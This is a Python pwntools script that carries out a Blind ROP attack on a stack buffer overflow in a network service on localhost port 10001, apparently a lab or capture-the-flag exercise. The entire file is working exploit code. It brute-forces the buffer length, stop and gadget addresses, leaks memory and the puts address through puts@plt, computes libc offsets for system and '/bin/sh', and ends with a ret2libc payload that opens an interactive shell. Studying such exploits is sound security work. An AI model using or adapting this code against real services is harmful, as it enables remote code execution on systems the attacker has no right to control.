#!/usr/bin/env python

from pwn import *

#context.log_level = 'debug'

def get_buffer_size():
    for i in range(100):
        payload  = "A"
        payload += "A"*i
        buf_size = len(payload) - 1
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.send(payload)
            p.recv()
            p.close()
            log.info("bad: %d" % buf_size)
        except EOFError as e:
            p.close()
            log.info("buffer size: %d" % buf_size)
            return buf_size

def get_stop_addr(buf_size):
    addr = 0x400000
    while True:
        sleep(0.1)
        addr += 1
        payload  = "A"*buf_size
        payload += p64(addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.sendline(payload)
            p.recvline()
            p.close()
            log.info("stop address: 0x%x" % addr)
            return addr
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1

def get_gadgets_addr(buf_size, stop_addr):
    addr = stop_addr
    while True:
        sleep(0.1)
        addr += 1
        payload  = "A"*buf_size
        payload += p64(addr)
        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)
        payload += p64(stop_addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.sendline(payload)
            p.recvline()
            p.close()
            log.info("find address: 0x%x" % addr)
            try:    # check
                payload  = "A"*buf_size
                payload += p64(addr)
                payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) + p64(6)

                p = remote('127.0.0.1', 10001)
                p.recvline()
                p.sendline(payload)
                p.recvline()
                p.close()
                log.info("bad address: 0x%x" % addr)
            except:
                p.close()
                log.info("gadget address: 0x%x" % addr)
                return addr
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1

def get_puts_plt(buf_size, stop_addr, gadgets_addr):
    pop_rdi = gadgets_addr + 9      # pop rdi; ret;
    addr = stop_addr
    while True:
        sleep(0.1)
        addr += 1

        payload  = "A"*buf_size
        payload += p64(pop_rdi)
        payload += p64(0x400000)
        payload += p64(addr)
        payload += p64(stop_addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.sendline(payload)
            if p.recv().startswith("\x7fELF"):
                log.info("puts@plt address: 0x%x" % addr)
                p.close()
                return addr
            log.info("bad: 0x%x" % addr)
            p.close()
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1

def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):
    pop_rdi  = gadgets_addr + 9     # pop rdi; ret

    result = ""
    while start_addr < end_addr:
        #print result.encode('hex')
        sleep(0.1)
        payload  = "A"*buf_size
        payload += p64(pop_rdi)
        payload += p64(start_addr)
        payload += p64(puts_plt)
        payload += p64(stop_addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.sendline(payload)
            data = p.recv(timeout=0.1)      # timeout makes sure to recive all bytes
            if data == "\n":
                data = "\x00"
            elif data[-1] == "\n":
                data = data[:-1]
            log.info("leaking: 0x%x --> %s" % (start_addr,(data or '').encode('hex')))
            result += data
            start_addr += len(data)
            p.close()
        except:
            log.info("Can't connect")
    return result

def get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got):
    pop_rdi  = gadgets_addr + 9

    payload  = "A"*buf_size
    payload += p64(pop_rdi)
    payload += p64(puts_got)
    payload += p64(puts_plt)
    payload += p64(stop_addr)

    p = remote('127.0.0.1', 10001)
    p.recvline()
    p.sendline(payload)
    data = p.recvline()
    data = u64(data[:-1] + '\x00\x00')
    log.info("puts address: 0x%x" % data)
    p.close()

    return data

#buf_size = get_buffer_size()
buf_size = 72

#stop_addr = get_stop_addr(buf_size)
stop_addr = 0x4005e5

#gadgets_addr = get_gadgets_addr(buf_size, stop_addr)
gadgets_addr = 0x40082a

#puts_plt = get_puts_plt(buf_size, stop_addr, gadgets_addr)
puts_plt = 0x4005e7     # fake puts
#puts_plt = 0x4005f0    # true puts

# dump code section from memory
# and then use Radare2 or IDA Pro to find the got address
#start_addr = 0x400000
#end_addr   = 0x401000
#code_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)
#with open('code.bin', 'wb') as f:
#   f.write(code_bin)
#   f.close()
puts_got = 0x00601018

# you can also dump data from memory and get information from .got
#start_addr = 0x600000
#end_addr   = 0x602000
#data_bin = dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr)
#with open('data.bin', 'wb') as f:
#    f.write(data_bin)
#    f.close()

# must close ASLR
#puts_addr = get_puts_addr(buf_size, stop_addr, gadgets_addr, puts_plt, puts_got)
puts_addr = 0x7ffff7a90210

# first add your own libc into libc-database: $ ./add /usr/lib/libc-2.26.so
# $ ./find puts 0x7ffff7a90210
# or $ ./find puts 210
# $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570
# $ ./dump local-e112b79b632f33fce6908f5ffd2f61a5d8058570 puts
# then you can get the following offset
offset_puts   = 0x000000000006f210
offset_system = 0x0000000000042010
offset_str_bin_sh = 0x17aff5

system_addr = (puts_addr - offset_puts) + offset_system
binsh_addr  = (puts_addr - offset_puts) + offset_str_bin_sh

# get shell
payload  = "A"*buf_size
payload += p64(gadgets_addr + 9)    # pop rdi; ret;
payload += p64(binsh_addr)
payload += p64(system_addr)
payload += p64(stop_addr)

p = remote('127.0.0.1', 10001)
p.recvline()
p.sendline(payload)
p.interactive()